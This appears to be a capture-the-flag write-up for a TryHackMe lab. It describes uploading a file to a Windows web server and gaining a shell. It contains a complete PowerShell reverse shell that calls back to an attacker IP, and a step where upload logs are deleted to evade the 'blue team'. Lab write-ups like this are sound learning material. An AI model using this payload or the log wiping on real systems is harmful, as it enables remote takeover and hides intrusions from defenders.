Start the VM by clicking the Start Machine button at the top right of the task and visit 10.10.34.210:8080 to pwn the machine. You can complete the challenge by connecting through VPN or the AttackBox containing all the essential tools.

I skipped the nmap scan and visited port 8080

We are greeted with a webpage with file upload capabilities

Started my nc listener on port 9001 and created a ps1 reverse shell payload and uploaded it 

Create a ps1 reverse shell: 

$LHOST = "10.6.9.14"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

Boom we got a low level shell

Looking around the file system we see url: http://10.10.34.210:8000/asdasdadasdjakjdnsdfsdfs.php

I guess blue team was alerted and we are hinted to remove the file upload logs to view the page

log path: C:\xampp\htdocs\uploads

delted all the logs and we get the first flag ;)

THM{****************}


